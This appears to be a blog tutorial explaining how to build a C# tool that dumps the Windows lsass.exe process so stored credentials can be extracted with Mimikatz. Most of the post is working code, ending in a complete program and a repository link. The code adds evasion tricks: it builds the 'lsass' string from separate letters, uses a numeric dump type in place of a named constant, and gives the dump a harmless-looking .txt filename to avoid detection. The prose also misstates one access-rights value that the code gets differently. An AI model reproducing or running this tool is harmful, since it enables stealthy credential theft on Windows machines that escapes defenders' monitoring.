---
layout: post
title: Customizing Lsass Dumps with C#
excerpt_separator: <!--more-->
---

Dumping the Lsass process to get the passwords stored in memory in a Windows machine is one of the most common uses of Mimikatz. However, there are stealthier methods to do this, such as using custom code. Doing so, we can customize the dump file name, using the hostname and date as name and harmless extensions such as ".txt" instead of ".dmp".

<!--more-->


## TL;DR

We will use C# to create a program that dumps the lsass.exe process in the stealthier way we can.  

Without input arguments it creates a dump file with the hostname and date as name and the ".txt" extension (*hostname_DD-MM-YYYY-HHMM.txt*). With input arguments it will use the first one as path and name for the file.  

To try to be stealthier, we will not use the "lsass" string and will try not to use the "minidump" string when possible. The final program is in [this link](https://github.com/ricardojoserf/lsass-dumper-csharp).


## Usage

The fastest way to use it is to right-click the file and click "Run as Administrator": 

![im1](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/custom-lsass-dumper-csharp/image1.png)

This generates a file with the hostname ("DESKTOP-MA54241") and the date (30/08/2021) as name and with extension ".txt":

![im2](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/custom-lsass-dumper-csharp/image2.png)

If we execute it from a command line we can choose any name or path:

![im3](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/custom-lsass-dumper-csharp/image3.png)

The file is generated correctly:

![im4](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/custom-lsass-dumper-csharp/image4.png)

Then we can parse these dump files with Mimikatz, as it does not care about the extension:

![im5](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/custom-lsass-dumper-csharp/image5.png)



# Code

To reach our goal, we will create a code that will:

- Check we are running an elevated process
- Get the lsass.exe PID
- Generate the file name or get it from the input arguments
- Create the output file with the correct name
- Get a handle to the lsass.exe process
- Dump the process


## Main function

First we need to check if the process is running with administrative privileges, as it will not work otherwise. We will use this code:

```c
// Check we are running an elevated process
if (WindowsIdentity.GetCurrent().Owner
      .IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid) == false)
{
    Console.WriteLine("[-] Error: Execute with administrative privileges.");
    return;
}
```

Then, as we are in an elevated process, we can retrieve the lsass.exe process ID with the function getProcessPid():

```c
int processPID = getProcessPid();
Console.WriteLine("[+] Process PID: " + processPID);
```

In this function we will use a very dumb obfuscation to avoid using the string "lsass" - we will concatenate each letter of the string, creating the new string *processname_str*:

```c
static int getProcessPid() {
            string str1 = "l";
            string str3 = "s";
            string str5 = "a";
            string processname_str = str1 + str3 + str5 + str3 + str3;
            int processPID = Process.GetProcessesByName(processname_str)[0].Id;
            return processPID;
        }
```

We will then generate a name for the dump file we will create, and also a pointer to it.
- If there is an input argument with a file name, we will use that
- If not, we will generate a file name using the hostname and date.
	- Format: hostname_DD-MM-YYYY-HHMM (for example, hostname_01-12-2021-1200)

```c
String filename;
if (args == null || args.Length == 0)
{
    // Source: https://docs.microsoft.com/en-us/dotnet/api/system.datetime.tostring?view=net-5.0
    String now = DateTime.Now.ToString("dd-MM-yy-HHmm");
    String extension = ".txt";
    filename = Directory.GetCurrentDirectory() + "\\" + Environment.MachineName + "_" + now + extension;
}
else
{
    filename = args[0];
}
```

With that dump file name, we will create the file (or overwrite it if it already exists!) with the class [FileStream](https://docs.microsoft.com/en-us/dotnet/api/system.io.filestream?view=net-5.0):

```c
FileStream output_file = new FileStream(filename, FileMode.Create);
```

We will create a handle to the process with the function [OpenProcess()](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess) and the minimum process rights we need: PROCESS_VM_READ and PROCESS_QUERY_INFORMATION. It would also work with PROCESS_ALL_ACCESS, but it is not necessary. These rights, as we can see [in here](https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights), translate to 0x0010 and 0x0040:

```c
uint processRights = 0x0010 | 0x0400;
IntPtr processHandle = OpenProcess(processRights, false, processPID)
```

We will check if the handle to the process is correct or not, and if it is we will dump the process. 

From [this link](https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/ne-minidumpapiset-minidump_type), we can find that *MiniDumpWithFullMemory*, the type of dump we want, translates to the value 0x00000002 (hopefully using this value instead of the string makes the process stealthier!). We will use that value, the process handle, process PID and the output file and feed it to the function [MiniDumpWriteDump()](https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump), which will do the work:


```c
if (processHandle != INVALID_HANDLE_VALUE)
{
    Console.WriteLine("[+] Handle to process created correctly.");
    //Dump the process            
    bool isDumped = MiniDumpWriteDump(processHandle, processPID, output_file.SafeFileHandle.DangerousGetHandle(), 2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
    if (isDumped)
    {
        Console.WriteLine("[+] Successfully dumped process with pid " + processPID + " to file " + filename);
    }
    else
    {
        Console.WriteLine("[-] Error: Process not dumped.");
    }
}
else {
    Console.WriteLine("[-] Error: Handle to process is NULL.");
}
```

<br>


## Final script

The resulting script (which can be found also in [this Github repository](https://github.com/ricardojoserf/lsass-dumper-csharp/blob/main/Program.cs)) is:

```c
using System;
using System.IO;
using System.Diagnostics;
using System.Security.Principal;
using System.Runtime.InteropServices;


namespace CustomDumper
{
    class Program
    {
        [DllImport("Dbghelp.dll")] static extern bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId, IntPtr hFile, int DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);
        [DllImport("kernel32.dll")] static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
        static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);


        static int getProcessPid() {
            string str1 = "l";
            string str3 = "s";
            string str5 = "a";
            string processname_str = str1 + str3 + str5 + str3 + str3;
            int processPID = Process.GetProcessesByName(processname_str)[0].Id;
            return processPID;
        }


        static void Main(string[] args)
        {
            // Check we are running an elevated process
            if (WindowsIdentity.GetCurrent().Owner
                  .IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid) == false)
            {
                Console.WriteLine("[-] Error: Execute with administrative privileges.");
                return;
            }

            //Get process PID
            int processPID = getProcessPid();
            Console.WriteLine("[+] Process PID: " + processPID);

            // Generate the file name or get it from the input arguments
            String filename;
            if (args == null || args.Length == 0)
            {
                String now = DateTime.Now.ToString("dd-MM-yy-HHmm");
                String extension = ".txt";
                filename = Directory.GetCurrentDirectory() + "\\" + Environment.MachineName + "_" + now + extension;
            }
            else
            {
                filename = args[0];
            }


            // Create output file
            FileStream output_file = new FileStream(filename, FileMode.Create);

            // Create handle to the process
            uint processRights = 0x0010 | 0x0400;
            IntPtr processHandle = OpenProcess(processRights, false, processPID);

            if (processHandle != INVALID_HANDLE_VALUE)
            {
                Console.WriteLine("[+] Handle to process created correctly.");
                //Dump the process            
                bool isDumped = MiniDumpWriteDump(processHandle, processPID, output_file.SafeFileHandle.DangerousGetHandle(), 2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
                if (isDumped)
                {
                    Console.WriteLine("[+] Successfully dumped process with pid " + processPID + " to file " + filename);
                }
                else
                {
                    Console.WriteLine("[-] Error: Process not dumped.");
                }
            }
            else {
                Console.WriteLine("[-] Error: Handle to process is NULL.");
            }
            
        }

    }
}
```
